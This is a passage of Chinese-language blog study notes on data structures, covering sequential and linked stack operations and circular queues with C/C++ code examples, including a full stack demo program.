class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="顺序栈的入栈">7. 顺序栈的入栈</h3><ol type="1"><li>判断是否栈满，若满则出错（上溢）</li><li>元素e压入栈顶</li><li>栈顶指针加1</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//进栈(插入新元素e)</span><br>Status <span class="hljs-title function_">Push</span><span class="hljs-params">(SqStack &amp;S, SElemType e)</span>&#123;<br>    <span class="hljs-keyword">if</span> (S.top - S.base == S.Stacksize) <span class="hljs-keyword">return</span> ERROR;  <span class="hljs-comment">//栈满</span><br>    <span class="hljs-comment">//给top所指的位置赋值</span><br>    *S.top = e;<br>    top++;<br>    <br>    <span class="hljs-keyword">return</span> OK;<br>&#125; <br><span class="hljs-comment">//上面栈满之后也可以扩大栈的大小：</span><br>S.base = (ElemType *)<span class="hljs-built_in">realloc</span>(S.base, (S.Stacksize+STACKINCREME) *<span class="hljs-keyword">sizeof</span>(ElemType));<br>    <span class="hljs-keyword">if</span> (!S.base) <span class="hljs-built_in">exit</span>(OVERFLOW);<br>    S.top = S.base + S.Stacksize;<br>    S.Stacksize = S.Stacksize + STACKINCREMENT;<br> <br></code></pre></td></tr></table></figure><h3 id="顺序栈的出栈">8. 顺序栈的出栈</h3><ol type="1"><li>判断是否栈空，若空则出错（下溢）</li><li>栈顶指针减1</li><li>获取栈顶元素e</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//出栈(删除栈顶元素e)</span><br><span class="hljs-comment">// 若栈不空，则删除S的栈顶无素，用e返回其值，并返回OK；否则返回ERROR</span><br>Status <span class="hljs-title function_">Pop</span><span class="hljs-params">(SqStack &amp;S, SElemType &amp;e)</span>&#123;<br>    <span class="hljs-keyword">if</span> (S.top==S.base) <span class="hljs-keyword">return</span> ERROR; <span class="hljs-comment">//等价于if(StackEmpty(S))</span><br>    S.top-- ;<br>    e=*S.top;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="小结">9. ⭐小结</h3><p>以下代码是在Vscode上实现的顺序栈的操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRUE 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FALSE 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW -2</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Status;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> SElemType;   <span class="hljs-comment">// ElemType的类型根据实际情况而定，这里假定为int</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    SElemType *base;  <span class="hljs-comment">// 栈底指针</span><br>    SElemType *top;   <span class="hljs-comment">// 栈顶指针</span><br>    <span class="hljs-type">int</span> stacksize;    <span class="hljs-comment">// 栈可用最大容量</span><br>&#125; SqStack;<br><br><br><span class="hljs-comment">// 初始化栈,构造一个空栈S</span><br><span class="hljs-function">Status <span class="hljs-title">InitStack</span><span class="hljs-params">(SqStack &amp;S)</span> </span>&#123;<br>    S.base = <span class="hljs-keyword">new</span> SElemType[MAXSIZE];<br>    <span class="hljs-comment">// 或S.base = (SElemType *)malloc(MAXSIZE*sizeof(SElemType));</span><br>    <span class="hljs-keyword">if</span> (!S.base) <span class="hljs-built_in">exit</span>(OVERFLOW); <span class="hljs-comment">// 存储分配失败</span><br>    S.top = S.base; <span class="hljs-comment">// 栈顶指针等于栈底指针</span><br>    S.stacksize = MAXSIZE;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">// 判断是否为空栈</span><br><span class="hljs-function">Status <span class="hljs-title">StackEmpty</span><span class="hljs-params">(SqStack S)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (S.top == S.base)<br>        <span class="hljs-keyword">return</span> TRUE; <span class="hljs-comment">// 栈为空返回TRUE</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> FALSE; <span class="hljs-comment">// 栈不为空返回FALSE</span><br>&#125;<br><br><span class="hljs-comment">// 获取栈的长度</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">StackLength</span><span class="hljs-params">(SqStack S)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> S.top - S.base;<br>&#125;<br><br><span class="hljs-comment">//清空顺序栈</span><br><span class="hljs-function">Status <span class="hljs-title">ClearStack</span><span class="hljs-params">(SqStack &amp;S)</span></span>&#123; <span class="hljs-comment">//这里应该加上&amp;</span><br>    <span class="hljs-keyword">if</span>(S.base) S.top = S.base;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;  <br><br><span class="hljs-comment">//销毁了之后空间豆释放了</span><br><span class="hljs-function">Status <span class="hljs-title">DestroyStack</span><span class="hljs-params">(SqStack &amp;S)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(S.base)&#123;<br>        <span class="hljs-keyword">delete</span> S.base;<br>        S.stacksize = <span class="hljs-number">0</span>;<br>        S.base = S.top = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>   <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br><br><span class="hljs-comment">//进栈(插入新元素e)</span><br><span class="hljs-function">Status <span class="hljs-title">Push</span><span class="hljs-params">(SqStack &amp;S, SElemType e)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> (S.top - S.base == S.stacksize) <span class="hljs-keyword">return</span> ERROR;  <span class="hljs-comment">//栈满</span><br>    <span class="hljs-comment">//给top所指的位置赋值</span><br>    *S.top = e;<br>    S.top++;<br>    <br>    <span class="hljs-keyword">return</span> OK;<br>&#125; <br><br><span class="hljs-comment">// 出栈(删除栈顶元素e)</span><br><span class="hljs-comment">// 若栈不空，则删除S的栈顶无素，用e返回其值，并返回OK；否则返回ERROR</span><br><span class="hljs-function">Status <span class="hljs-title">Pop</span><span class="hljs-params">(SqStack &amp;S, SElemType &amp;e)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> (S.top==S.base) <span class="hljs-keyword">return</span> ERROR; <span class="hljs-comment">//等价于if(StackEmpty(S))</span><br>    S.top-- ;<br>    e=*S.top;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">// 输出栈中的内容，为空输出当前栈为空，不存在输出当前栈不存在</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintStack</span><span class="hljs-params">(SqStack S)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!S.base) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;当前栈不存在\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">StackEmpty</span>(S)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;当前栈为空\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈中的内容为：\n&quot;</span>);<br>        SElemType *p = S.base;<br>        <span class="hljs-keyword">while</span> (p != S.top) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, *p);<br>            p++;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 主函数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    SqStack S;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----初始化一个栈----\n&quot;</span>);<br>    <span class="hljs-built_in">InitStack</span>(S);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----输出栈中的内容----\n&quot;</span>);<br>    <span class="hljs-built_in">PrintStack</span>(S);<br><br>    <span class="hljs-comment">// 入栈操作</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n----入栈操作----\n&quot;</span>);<br>    <span class="hljs-type">int</span> e = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">Push</span>(S, e);<br>    e = <span class="hljs-number">2</span>;<br>    <span class="hljs-built_in">Push</span>(S, e);<br>    e = <span class="hljs-number">3</span>;<br>    <span class="hljs-built_in">Push</span>(S, e);<br>    e = <span class="hljs-number">8</span>;<br>    <span class="hljs-built_in">Push</span>(S, e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----输出栈中的内容----\n&quot;</span>);<br>    <span class="hljs-built_in">PrintStack</span>(S);<br><br>    <span class="hljs-type">int</span> length = <span class="hljs-built_in">StackLength</span>(S);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈当前的长度为：%d\n&quot;</span>,length);<br><br><br>    <span class="hljs-comment">// 出栈操作，直到栈为空</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n----出栈操作----\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">StackEmpty</span>(S)) &#123;<br>        SElemType e2 = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 初始化e2，就是一个值来存储一下出栈的元素</span><br>        <span class="hljs-built_in">Pop</span>(S, e2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出栈元素：%d\n&quot;</span>, e2);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈已为空\n&quot;</span>);<br><br>    <span class="hljs-comment">// int e2;</span><br>    <span class="hljs-comment">// Pop(S,e2);</span><br>    <span class="hljs-comment">// Pop(S,e2);</span><br>    <span class="hljs-comment">// printf(&quot;出栈元素：%d\n&quot;, e2);</span><br>    <span class="hljs-comment">// PrintStack(S);</span><br><br>    <span class="hljs-comment">// 清空栈</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n----清空栈----\n&quot;</span>);<br>    <span class="hljs-built_in">ClearStack</span>(S);<br>    <span class="hljs-built_in">PrintStack</span>(S);<br><br>    <span class="hljs-comment">// 销毁栈</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n----销毁栈----\n&quot;</span>);<br>    <span class="hljs-built_in">DestroyStack</span>(S);<br>    <span class="hljs-built_in">PrintStack</span>(S);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="链栈的表示和实现">3.3.3 链栈的表示和实现</h2><p>链栈是运算受限的单链表，只能在链表头部进行操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">StackNode</span>&#123;</span><br>    SElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">StackNode</span> *<span class="hljs-title">next</span>;</span><br>&#125; StackNode，*LinkStack;<br>LinkStack S;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312231928403.png"alt="链栈" /><figcaption aria-hidden="true">链栈</figcaption></figure><ul><li>链表的头指针就是栈顶</li><li>不需要头结点</li><li>基本不存在栈满的情况（内存中有空间就行）</li><li>空栈相当于头指针指向空</li><li>插入和删除仅在栈顶处执行</li></ul><h3 id="链栈的初始化">1. 链栈的初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">InitStack</span><span class="hljs-params">(LinkStack &amp;S)</span>&#123;<br>    <span class="hljs-comment">//构造一个空栈，栈顶指针置为空</span><br>    S = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="判断链栈是否为空">2. 判断链栈是否为空</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">Status <span class="hljs-title function_">StackEmpty</span><span class="hljs-params">(LinkStack S)</span>&#123;<br>    <span class="hljs-keyword">if</span> (S==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> TRUE;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链栈的入栈">3. 链栈的入栈</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312231936898.png"alt="链栈的入栈" /><figcaption aria-hidden="true">链栈的入栈</figcaption></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">Status <span class="hljs-title function_">Push</span><span class="hljs-params">(LinkStack &amp;S, SElemType e)</span>&#123;<br>    LinkStack p;<br>    p = new StackNode;  <span class="hljs-comment">//生成新结点p</span><br>    p-&gt;data = e;  <span class="hljs-comment">//将新结点数据域置为e</span><br>    p-&gt;next = S;  <span class="hljs-comment">//将新结点插入栈顶</span><br>    S = p;  <span class="hljs-comment">//修改栈顶指针</span><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链栈的出栈">4. 链栈的出栈</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312231941684.png"alt="链栈的出栈" /><figcaption aria-hidden="true">链栈的出栈</figcaption></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">Status <span class="hljs-title function_">Pop</span> <span class="hljs-params">(LinkStack &amp;S,SElemType &amp;e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(S==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> ERROR;<br>    e = S-&gt; data;<br>p = S;<br>S = S-&gt; next;<br>delete p;<br><span class="hljs-keyword">return</span> OK:<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="取栈顶元素">5. 取栈顶元素</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">SElemType <span class="hljs-title function_">GetTop</span><span class="hljs-params">(LinkStack S)</span> &#123;<br>    <span class="hljs-keyword">if</span> (S!=<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> S-&gt;data;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="栈与递归">3.4 栈与递归</h1><p>递归的定义</p><ul><li>若一个对象部分地包含它自己，或用它自己给自己定义，则称这个对象是递归的</li><li>若一个过程直接地或间接地调用自己，则称这个过程是递归的过程</li></ul><p><span class="math inline">\(f(g(x))\)</span></p><h1 id="队列的表示和操作实现">3.5 队列的表示和操作实现</h1><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312231954993.png"alt="队列" /><figcaption aria-hidden="true">队列</figcaption></figure><h2 id="队列抽象数据类型的定义">3.5.1 队列抽象数据类型的定义</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312231957540.png"alt="1703332636642" /><figcaption aria-hidden="true">1703332636642</figcaption></figure><h2 id="队列的顺序表示和实现">3.5.2 队列的顺序表示和实现</h2><h3 id="队列的顺序表示">1. 队列的顺序表示</h3><p>队列的物理存储可以用顺序存储结构，也可用链式存储结构。相应的，队列的存储方式也分为两种，即顺序队列和链式队列。</p><p>队列的顺序表示：用一维数组base[MAXQSIZE]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXQSIZE 100 <span class="hljs-comment">//最大队列长度</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    QElemType *base;<span class="hljs-comment">//初始化的动态分配存储空间</span><br>    <span class="hljs-type">int</span> front; <span class="hljs-comment">//头指针</span><br>    <span class="hljs-type">int</span> rear; <span class="hljs-comment">//尾指针</span><br>&#125;SqQueue;<br></code></pre></td></tr></table></figure><p>初始状态（队空条件）：<code>Q.front == Q.rear == 0</code>。</p><p>进队操作：队不满时，先送值到队尾元素，再将队尾指针加1。</p><p>出队操作：队不空时，先取队头元素值，再将队头指针加1。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312232030736.png"alt="队列的操作" /><figcaption aria-hidden="true">队列的操作</figcaption></figure><p>如图d，队列出现“上溢出”，然而却又不是真正的溢出，所以是一种“假溢出”。</p><p>解决假上溢的方法：</p><p>1、将队中元素依次向队头方向移动。缺点：浪费时间，每移动一次，队中元素都要移动</p><p>2、将队空间设想成一个<strong>循环</strong>的表即分配给队列的m个存储单元可以循环使用，当rear为maxqsize时，若向量的开始端空着，又可从头使用空着的空间。当front为maxqsize时，,也是一样</p><p>怎么实现呢，想到了模运算，循环实现</p><h2 id="循环队列">3.5.3 循环队列</h2><p>解决假上溢的方法——引入<strong>循环队列</strong></p><p><code>base[0]</code>接在<code>base[MAXQSIZE -1]</code>之后，若<code>rear+1==M</code>，则令rear=0</p><p>实现方法：利用模(mod，C语言中: %) 运算</p><p>插入元素</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Q</span>.</span></span>base<span class="hljs-literal">[Q.<span class="hljs-identifier">rear</span>]</span>=x;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Q</span>.</span></span>rear=(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Q</span>.</span></span>rear+<span class="hljs-number">1</span>) % MAXQSIZE;<br></code></pre></td></tr></table></figure><p>删除元素</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">x</span> = Q.base[Q.front]<span class="hljs-comment">;</span><br><span class="hljs-attr">Q.front</span> = (Q.front+<span class="hljs-number">1</span>) % MAXQSIZE<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>循环队列：循环使用为队列分配的存储空间。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241525569.png"alt="循环队列" /><figcaption aria-hidden="true">循环队列</figcaption></figure><p>队空：<code>front==rear</code> 队满：<code>front==rear</code></p><p>解决方案：</p><ol type="1"><li>另外设一个标志以区别队空、队满</li><li>另设一个变量，记录元素个数</li><li><strong>少用一个元素空间</strong>（这里我们用这个</li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241527211.png"alt="如何判断队空队满" /><figcaption aria-hidden="true">如何判断队空队满</figcaption></figure><h3 id="循环队列的类型定义">1. 循环队列的类型定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//类型定义</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXQSIZE 100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    QElemType *base;  <span class="hljs-comment">//这里是动态分配存储空间，或 QElemType base[MAXQSIZE];</span><br>    <span class="hljs-type">int</span> front; <span class="hljs-comment">// 头指针，若队列不空，指向队列头元素</span><br>    <span class="hljs-type">int</span> rear; <span class="hljs-comment">// 尾指针，若队列不空，指向队列尾元素的下一个位置</span><br>&#125;SqQueue;<br><span class="hljs-comment">//SqQueue是普通类型，普通类型在引用成员的时候是加.，</span><br><span class="hljs-comment">//如果是*SqQueue，它是指针类型，引用的话是用-&gt;，  详细见下面的程序</span><br></code></pre></td></tr></table></figure><h3 id="循环队列的初始化">2. 循环队列的初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//构造一个空队列</span><br>Status <span class="hljs-title function_">InitQueue</span><span class="hljs-params">(SqQueue &amp;Q)</span>&#123;<br>    Q.base = new QElemType[MAXQSIZE]<br>    <span class="hljs-comment">// 或者用c语言的语法：Q.base=(QElemType *)malloc(MAXQSIZE*sizeof(QElemType));</span><br>    <span class="hljs-keyword">if</span> (!Q.base) <span class="hljs-built_in">exit</span>(OVERFLOW);<span class="hljs-comment">//存储分配失败</span><br>    Q.front = Q.rear = <span class="hljs-number">0</span>; <span class="hljs-comment">//头指针尾指针置为0，队列为空</span><br>    <span class="hljs-keyword">return</span> OK;<br> &#125;<br><br><span class="hljs-comment">//这里后面函数调用写成：、</span><br>SqQueue Q;<br>InitQueue(Q);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*初始化一个空队列Q*/</span><br>Status <span class="hljs-title function_">InitQueue</span><span class="hljs-params">(SqQueue *Q)</span>&#123;<br>    Q-&gt;front = <span class="hljs-number">0</span>;<br>    Q-&gt;rear = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><span class="hljs-comment">//这里用的就是-&gt;</span><br><br><span class="hljs-comment">//⭐但是注意这里后面的函数调用要写成：</span><br>SqQueue Q;<br>InitQueue(&amp;Q);<br></code></pre></td></tr></table></figure><h3 id="求队列的长度">3. 求队列的长度</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//求队列的长度</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">QueueLength</span><span class="hljs-params">(SqQueue Q)</span>&#123;<br>   L = (Q.rear - Q.front + MAXQSIZE) % MAXQSIZE;<br>   <span class="hljs-keyword">return</span> (L);<br> &#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241538961.png"alt="求循环队列的长度" /><figcaption aria-hidden="true">求循环队列的长度</figcaption></figure><p>左间的图：rear是5，front是0，5-0+6=11，11%6=5</p><p>中间的图：rear是0，front是4，0-4+6=2，2%6=2</p><p>右边的图：rear是3，front是4，3-4+6=5，5%6=5</p><h3 id="循环队列入队">4. 循环队列入队</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//插入元素(入队)</span><br>Status <span class="hljs-title function_">EnQueue</span><span class="hljs-params">(SqQueue &amp;Q, QElemType e)</span>&#123;<br>    <span class="hljs-keyword">if</span> ((Q.rear+<span class="hljs-number">1</span>) % MAXQSIZE == Q.front) <span class="hljs-keyword">return</span> ERROR; <span class="hljs-comment">//队列满</span><br>    Q.base[Q.rear] = e; <span class="hljs-comment">//新元素加入队尾</span><br>    Q.rear = (Q.rear+<span class="hljs-number">1</span>) % MAXQSIZE; <span class="hljs-comment">//队尾指针加1</span><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="循环队列出队">5. 循环队列出队</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//删除元素(出队)</span><br>Status <span class="hljs-title 